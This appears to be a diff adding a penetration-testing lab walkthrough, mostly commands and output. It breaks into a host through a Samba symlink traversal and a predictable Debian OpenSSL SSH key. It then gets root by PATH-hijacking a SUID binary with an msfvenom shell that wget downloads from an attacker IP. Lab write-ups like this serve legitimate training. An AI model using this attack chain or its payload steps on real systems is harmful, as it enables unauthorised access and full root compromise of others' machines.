@@ -1,0 +1,92 @@
+# found ssh and smb are running on the target
+22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)
+445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)
+
+# reveal smb shares and found bob share has read and write permissions
+smbmap -H $IP
+	Disk         Permissions     Comment
+	----         -----------     -------
+	IPC$         NO ACCESS       IPC Service (sufferance debian server)
+	Bob Share    READ, WRITE     Bob Docs
+	print$       NO ACCESS       Printer Drivers
+
+# list bob share
+smbmap -R Bob\ Share -H $IP / smbmap -R "Bob Share" -H $IP
+	Disk                                                    Permissions     Comment
+    ----                                                    -----------     -------
+    Bob Share                                               READ, WRITE
+    .\Bob Share\*
+    dr--r--r--                0 Mon Jun  6 10:48:07 2022    .
+    dr--r--r--                0 Sun Jan 30 05:07:10 2011    ..
+    fr--r--r--                0 Fri Oct 10 09:55:55 2008    Contract Mr. Suzuki.txt
+    dr--r--r--                0 Wed Oct  8 10:39:21 2008    tobesecured
+    fr--r--r--               28 Fri Jan  8 13:02:11 2016    Draft Contract Mr. Yamamoto.txt
+
+# download file
+smbmap -R "Bob Share" -H $IP -A "Draft Contract Mr. Yamamoto.txt" -q
+	
+# read "Draft Contract Mr. Yamamoto.txt"
+"Sell all of thinc's secrets"
+
+# google smb version and found the vulerability
+samba 3.0 24 directory traversal vulnerability
+
+# msf to generate the connection (rootfs) to other directories
+# Ref: https://null-byte.wonderhowto.com/how-to/get-root-filesystem-access-via-samba-symlink-traversal-0198509/
+msf6 auxiliary(admin/smb/samba_symlink_traversal)
+smbclient -U '%' -N \\\\$IP\\"Bob Share"
+
+# found OpenSSH 4.3p2 Debian 9 is vulnerable
+Debian OpenSSL Predictable PRNG
+git clone https://github.com/g0tmi1k/debian-ssh.git
+
+# POC: authorised_keys can be obtained and the corresponding private can also be retrieved as they are predictable at this version
+
+# authorized_keys has been found with rootfs access through smbclient
+/var/backups/ssh/authorized_keys
+
+# find cooresponding key based on the authorized_keys
+grep -lr "AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUN..."
+debian-ssh/common_keys/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858
+
+# add ssh configuration 
+Host 10.11.1.136
+    PubkeyAcceptedAlgorithms +ssh-dss
+
+# login with ssh (turn on verbose mode during troubleshooting)
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "KexAlgorithms=diffie-hellman-group-exchange-sha1" -i debian-ssh/common_keys/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@$IP -v
+
+# PE
+# found a unknown program that has SUID bit set
+/usr/local/bin/uploadtosecure
+
+# print out the text message from the unknown executable
+strings /usr/local/bin/uploadtosecure
+	/lib/ld-linux.so.2
+	__gmon_start__
+	libc.so.6
+	_IO_stdin_used
+	puts
+	system
+	__libc_start_main
+	GLIBC_2.0
+	PTRh0
+	[^_]
+	Archiving files to secure server...
+	scp -r file/tobesecured/* 10.10.11.100:/var/www/html/files/
+
+# the program runs scp with root privilege, so we can craft our own scp binary 
+# 	and modify the $PATH to redirect the `uploadtosecure` trigger our shell.
+msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o shell.elf
+wget http://192.168.119.201:9000/shell.elf -o scp
+chmod 775 scp
+export PATH=/<your dir...>
+
+
+
+
+
+
+
+
